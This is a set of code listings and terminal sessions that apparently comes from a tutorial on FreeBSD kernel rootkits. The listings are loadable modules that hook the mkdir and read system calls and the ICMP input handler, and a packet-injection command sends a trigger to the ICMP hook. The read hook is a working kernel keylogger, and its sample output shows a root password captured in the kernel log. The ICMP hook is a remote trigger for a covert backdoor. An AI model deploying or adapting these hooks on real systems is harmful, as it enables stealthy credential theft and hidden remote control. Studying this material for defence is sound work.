["```\n#include <sys/types.h>\n#include <sys/param.h>\n#include <sys/proc.h>\n#include <sys/module.h>\n#include <sys/sysent.h>\n#include <sys/kernel.h>\n#include <sys/systm.h>\n#include <sys/syscall.h>\n#include <sys/sysproto.h>\n\n/* mkdir system call hook. */\nstatic int\nmkdir_hook(struct thread *td, void *syscall_args)\n{\n\n      struct mkdir_args /* {\n                char    *path;\n                int     mode;\n        } */ *uap;\n        uap = (struct mkdir_args *)syscall_args;\n\n        char path[255];\n        size_t done;\n        int error;\n\n        error = copyinstr(uap->path, path, 255, &done);\n        if (error != 0)\n                return(error);\n\n        /* Print a debug message. */\n        uprintf(\"The directory \\\"%s\\\" will be created with the following\"\n            \" permissions: %o\\n\", path, uap->mode);\n\n        return(mkdir(td, syscall_args));\n}\n\n/* The function called at load/unload. */\nstatic int\nload(struct module *module, int cmd, void *arg)\n{\n        int error = 0;\n\n        switch (cmd) {\n        case MOD_LOAD:\n                /* Replace mkdir with mkdir_hook. */\n                ❶sysent[❷SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;\n                break;\n\n        case MOD_UNLOAD:\n                /* Change everything back to normal. */\n                ❸sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir;\n                break;\n\n        default:\n                error = EOPNOTSUPP;\n                break;\n        }\n\n        return(error);\n}\n\nstatic moduledata_t mkdir_hook_mod = {\n        \"mkdir_hook\",           /* module name */\n        load,                   /* event handler */\n        NULL                    /* extra data */\n};\n\nDECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);\n\n```", "```\n$ `sudo kldload ./mkdir_hook.ko`\n$ `mkdir test`\nThe directory \"test\" will be created with the following permissions: 777\n$ `ls -l`\n. . .\ndrwxr-xr-x  2 ghost  ghost   512 Mar 22 08:40 test\n\n```", "```\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <unistd.h>\n\nssize_t\nread(int fd, void *buf, size_t nbytes);\n\n```", "```\n#include <sys/types.h>\n#include <sys/param.h>\n#include <sys/proc.h>\n#include <sys/module.h>\n#include <sys/sysent.h>\n#include <sys/kernel.h>\n#include <sys/systm.h>\n#include <sys/syscall.h>\n#include <sys/sysproto.h>\n\n/*\n * read system call hook.\n * Logs all keystrokes from stdin.\n * Note: This hook does not take into account special characters, such as\n * Tab, Backspace, and so on.\n */\nstatic int\nread_hook(struct thread *td, void *syscall_args)\n{\n        struct read_args /* {\n                int     fd;\n                void    *buf;\n                size_t  nbyte;\n        } */ *uap;\n        uap = (struct read_args *)syscall_args;\n\n        int error;\n        char buf[1];\n        int done;\n\n        ❶error = read(td, syscall_args);\n\n        ❷if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))\n                ❸return(error);\n\n        ❹copyinstr(uap->buf, buf, 1, &done);\n        printf(\"%c\\n\", buf[0]);\n\n        return(error);\n}\n\n/* The function called at load/unload. */\nstatic int\nload(struct module *module, int cmd, void *arg)\n{\n        int error = 0;\n\n        switch (cmd) {\n        case MOD_LOAD:\n                /* Replace read with read_hook. */\n                sysent[SYS_read].sy_call = (sy_call_t *)read_hook;\n                break;\n\n        case MOD_UNLOAD:\n                /* Change everything back to normal. */\n                sysent[SYS_read].sy_call = (sy_call_t *)read;\n                break;\n\n        default:\n                error = EOPNOTSUPP;\n                break;\n        }\n\n        return(error);\n}\n\nstatic moduledata_t read_hook_mod = {\n        \"read_hook\",            /* module name */\n        load,                   /* event handler */\n        NULL                    /* extra data */\n};\n\nDECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);\n\n```", "```\nlogin: `root`\nPassword:\nLast login: Mon Mar 4 00:29:14 on ttyv2\n\nroot@alpha ~# `dmesg | tail -n 32`\nr\no\no\nt\n\np\na\ns\ns\nw\nd\n. . .\n\n```", "```\n$ `ktrace ls`\nfile1           file2           ktrace.out\n$ `kdump`\n   517 ktrace   RET   ktrace 0\n   517 ktrace   CALL  execve(0xbfbfe790,0xbfbfecdc,0xbfbfece4)\n   517 ktrace   NAMI  \"/sbin/ls\"\n   517 ktrace   RET   execve -1 errno 2 No such file or directory\n   517 ktrace   CALL  execve(0xbfbfe790,0xbfbfecdc,0xbfbfece4)\n   517 ktrace   NAMI  \"/bin/ls\"\n   517 ktrace   NAMI  \"/libexec/ld-elf.so.1\"\n   517 ls       RET   execve 0\n. . .\n   517 ls       CALL  ❶getdirentries(0x5,0x8054000,0x1000,0x8053014)\n   517 ls       RET   getdirentries 512/0x200\n   517 ls       CALL  getdirentries(0x5,0x8054000,0x1000,0x8053014)\n   517 ls       RET   getdirentries 0\n   517 ls       CALL  ❷lseek(0x5,0,0,0,0)\n   517 ls       RET   lseek 0\n   517 ls       CALL  ❸close(0x5)\n   517 ls       RET   close 0\n   517 ls       CALL  ❹fchdir(0x4)\n   517 ls       RET   fchdir 0\n   517 ls       CALL  close(0x4)\n   517 ls       RET   close 0\n   517 ls       CALL  fstat(0x1,0xbfbfdea0)\n   517 ls       RET   fstat 0\n   517 ls       CALL  break(0x8056000)\n   517 ls       RET   break 0\n   517 ls       CALL  ioctl(0x1,TIOCGETA,0xbfbfdee0)\n   517 ls       RET   ioctl 0\n   517 ls       CALL  write(0x1,0x8055000,0x19)\n   517 ls       GIO   fd 1 wrote 25 bytes\n       \"file1           file2           ktrace.out\n       \"\n   517 ls       RET   write 25/0x19\n   517 ls       CALL  exit(0)\n\n```", "```\nstruct protosw {\n        short   pr_type;                /* socket type */\n        struct  domain *pr_domain;      /* domain protocol */\n        short   pr_protocol;            /* protocol number */\n        short   pr_flags;\n/* protocol-protocol hooks */\n        pr_input_t *pr_input;           /* input to protocol (from below) */\n        pr_output_t *pr_output;         /* output to protocol (from above) */\n        pr_ctlinput_t *pr_ctlinput;     /* control input (from below) */\n        pr_ctloutput_t *pr_ctloutput;   /* control output (from above) */\n/* user-protocol hook */\n        pr_usrreq_t     *pr_ousrreq;\n/* utility hooks */\n        pr_init_t *pr_init;\n        pr_fasttimo_t *pr_fasttimo;     /* fast timeout (200ms) */\n        pr_slowtimo_t *pr_slowtimo;     /* slow timeout (500ms) */\n        pr_drain_t *pr_drain;           /* flush any excess space possible */\n\n        struct  pr_usrreqs *pr_usrreqs; /* supersedes pr_usrreq() */\n};\n\n```", "```\nstruct protosw ❶inetsw[] = {\n{\n        .pr_type =              0,\n        .pr_domain =            &inetdomain,\n        .pr_protocol =          IPPROTO_IP,\n        .pr_init =              ip_init,\n        .pr_slowtimo =          ip_slowtimo,\n        .pr_drain =             ip_drain,\n        .pr_usrreqs =           &nousrreqs\n},\n{\n        .pr_type =              SOCK_DGRAM,\n        .pr_domain =            &inetdomain,\n        .pr_protocol =          IPPROTO_UDP,\n        .pr_flags =             PR_ATOMIC|PR_ADDR,\n        .pr_input =             udp_input,\n        .pr_ctlinput =          udp_ctlinput,\n        .pr_ctloutput =         ip_ctloutput,\n        .pr_init =              udp_init,\n        .pr_usrreqs =           &udp_usrreqs\n},\n{\n        .pr_type =              SOCK_STREAM,\n        .pr_domain =            &inetdomain,\n        .pr_protocol =          IPPROTO_TCP,\n        .pr_flags =             PR_CONNREQUIRED|PR_IMPLOPCL|PR_WANTRCVD,\n        .pr_input =             tcp_input,\n        .pr_ctlinput =          tcp_ctlinput,\n        .pr_ctloutput =         tcp_ctloutput,\n        .pr_init =              tcp_init,\n        .pr_slowtimo =          tcp_slowtimo,\n        .pr_drain =             tcp_drain,\n        .pr_usrreqs =           &tcp_usrreqs\n},\n. . .\n\n```", "```\n#include <sys/param.h>\n#include <sys/proc.h>\n#include <sys/module.h>\n#include <sys/kernel.h>\n#include <sys/systm.h>\n#include <sys/mbuf.h>\n#include <sys/protosw.h>\n\n#include <netinet/in.h>\n#include <netinet/in_systm.h>\n#include <netinet/ip.h>\n#include <netinet/ip_icmp.h>\n#include <netinet/ip_var.h>\n#define TRIGGER \"Shiny.\"\n\nextern struct protosw inetsw[];\npr_input_t icmp_input_hook;\n\n/* icmp_input hook. */\nvoid\nicmp_input_hook(struct mbuf *m, int off)\n{\n        struct icmp *icp;\n        ❶int hlen = off;\n\n        /* Locate the ICMP message within m. */\n        m->m_len -= hlen;\n        ❷m->m_data += hlen;\n\n        /* Extract the ICMP message. */\n        ❸icp = mtod(m, struct icmp *);\n\n        /* Restore m. */\n        ❹m->m_len += hlen;\n        m->m_data -= hlen;\n\n        /* Is this the ICMP message we are looking for? */\n        if (icp->icmp_type == ICMP_REDIRECT &&\n            icp->icmp_code == ICMP_REDIRECT_TOSHOST &&\n            strncmp(icp->icmp_data, TRIGGER, 6) == 0)\n                 ❺printf(\"Let's be bad guys.\\n\");\n        else\n                icmp_input(m, off);\n}\n\n/* The function called at load/unload. */\nstatic int\nload(struct module *module, int cmd, void *arg)\n{\n        int error = 0;\n\n        switch (cmd) {\n        case MOD_LOAD:\n                /* Replace icmp_input with icmp_input_hook. */\n                ❻inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;\n                break;\n\n        case MOD_UNLOAD:\n                /* Change everything back to normal. */\n                ❼inetsw[❽ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;\n                break;\n\n        default:\n                error = EOPNOTSUPP;\n                break;\n        }\n\n        return(error);\n}\n\nstatic moduledata_t icmp_input_hook_mod = {\n        \"icmp_input_hook\",      /* module name */\n        load,                   /* event handler */\n        NULL                    /* extra data */\n};\n\nDECLARE_MODULE(icmp_input_hook, icmp_input_hook_mod, SI_SUB_DRIVERS,\n     SI_ORDER_MIDDLE);\n\n```", "```\n$ `sudo kldload ./icmp_input_hook.ko`\n$ `echo Shiny. > payload`\n$ `sudo nemesis icmp -i 5 -c 3 -P ./payload -D 127.0.0.1`\n\nICMP Packet Injected\n$ `dmesg | tail -n 1`\nLet's be bad guys.\n\n```"]